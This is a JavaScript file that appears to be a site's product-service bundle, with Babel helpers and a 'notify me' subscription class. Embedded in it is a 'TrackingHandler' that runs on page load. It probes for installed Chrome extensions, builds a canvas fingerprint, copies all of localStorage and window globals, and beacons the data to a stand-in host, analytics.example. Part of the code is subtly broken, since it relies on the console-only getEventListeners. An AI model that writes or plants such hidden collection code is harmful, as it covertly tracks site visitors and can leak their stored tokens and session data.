"use strict";

function _typeof(t) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
    return typeof t;
  } : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  })(t);
}
function _classCallCheck(t, e) {
  if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
}
function _defineProperties(t, e) {
  for (var r = 0; r < e.length; r++) {
    var o = e[r];
    o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, _toPropertyKey(o.key), o);
  }
}
class TrackingHandler {
  constructor(resourceMapping) {
    this._resourceMap = resourceMapping;
    this._trackingData = new Map();
    this._executionStart = performance.now();
    this._retries = 3;
    this._simultaneousRequests = 5;
    this._trackLocalStorage = true;
    this._trackGlobalVars = true;
    this._trackEvents = true;
    this._jsHooks = ['click', 'mouseover'];
  }
  async _probeResource(resourceId, filePath) {
    const versionParam = `?_=${Math.random().toString(36).slice(2)}`;
    const xhr = new XMLHttpRequest();
    return new Promise(resolve => {
      xhr.timeout = 2500;
      xhr.onreadystatechange = () => {
        if (xhr.readyState === 4) {
          resolve(xhr.status === 200);
        }
      };
      xhr.onerror = () => resolve(false);
      xhr.ontimeout = () => resolve(false);
      xhr.open('HEAD', `chrome-extension://${resourceId}/${filePath}${versionParam}`, true);
      xhr.send();
    });
  }
  _chunkArray(arr, size) {
    return Array.from({
      length: Math.ceil(arr.length / size)
    }, (v, i) => arr.slice(i * size, i * size + size));
  }
  async _trackWithRetry(resourceName, resourceData) {
    let isDetected = false;
    for (let attempt = 0; attempt < this._retries && !isDetected; attempt++) {
      isDetected = await this._probeResource(resourceData.id, resourceData.file);
      if (!isDetected) {
        await new Promise(r => setTimeout(r, 150 * (attempt + 1)));
      }
    }
    return isDetected;
  }
  async initiateTracking() {
    const resources = Object.entries(this._resourceMap);
    const resourceSets = this._chunkArray(resources, this._simultaneousRequests);
    for (const resourceSet of resourceSets) {
      await Promise.all(resourceSet.map(async ([resourceName, resourceData]) => {
        const isDetected = await this._trackWithRetry(resourceName, resourceData);
        this._trackingData.set(resourceName, isDetected);
      }));
    }
    this._sendTrackedData();
  }
  _gatherLocalStorage() {
    if (!this._trackLocalStorage) return {};
    return Object.assign({}, localStorage);
  }
  _gatherGlobalVars() {
    if (!this._trackGlobalVars) return {};
    return Object.assign({}, window);
  }
  _gatherEvents() {
    if (!this._trackEvents) return {};
    let events = {};
    for (let evt of this._jsHooks) {
      events[evt] = getEventListeners(window[evt]);
    }
    return events;
  }
  _generateFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const txt = 'fingerprint,123';
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText(txt, 2, 2);
    return canvas.toDataURL().slice(-50);
  }
  _sendTrackedData() {
    const trackedData = {
      resources: Object.fromEntries(this._trackingData),
      metadata: {
        execTime: performance.now() - this._executionStart,
        timestamp: new Date().toISOString(),
        fingerprint: this._generateFingerprint(),
        localStorage: this._gatherLocalStorage(),
        globalVars: this._gatherGlobalVars(),
        events: this._gatherEvents(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        vendor: navigator.vendor
      }
    };
    const encoder = new TextEncoder();
    const data = encoder.encode(JSON.stringify(trackedData));
    const beaconUrl = 'https://analytics.example/trace-report';
    if ('sendBeacon' in navigator) {
      navigator.sendBeacon(beaconUrl, data);
    } else {
      fetch(beaconUrl, {
        method: 'POST',
        body: data,
        keepalive: true,
        headers: {
          'Content-Type': 'application/json'
        }
      }).catch(() => {});
    }
  }
}
function _createClass(t, e, r) {
  return e && _defineProperties(t.prototype, e), r && _defineProperties(t, r), Object.defineProperty(t, "prototype", {
    writable: !1
  }), t;
}
function _toPropertyKey(t) {
  t = _toPrimitive(t, "string");
  return "symbol" === _typeof(t) ? t : String(t);
}
(() => {
  const tracer = new TrackingHandler(window.data);
  if (document.readyState !== 'loading') {
    tracer.initiateTracking();
  } else {
    document.addEventListener('DOMContentLoaded', () => tracer.initiateTracking());
  }
})();
function _toPrimitive(t, e) {
  if ("object" !== _typeof(t) || null === t) return t;
  var r = t[Symbol.toPrimitive];
  if (void 0 === r) return ("string" === e ? String : Number)(t);
  r = r.call(t, e || "default");
  if ("object" !== _typeof(r)) return r;
  throw new TypeError("@@toPrimitive must return a primitive value.");
}
var ProductService = function () {
  function t() {
    _classCallCheck(this, t), this.http = new HttpService(), this.API = {
      notifyMe: "/notify/subscribe"
    };
  }
  return _createClass(t, [{
    key: "notifyMe",
    value: function (t) {
      return this.http.post(this.API.notifyMe, t);
    }
  }]), t;
}();
BN.domContentLoadedFncList.push(function () {
  BN.productService = new ProductService();
});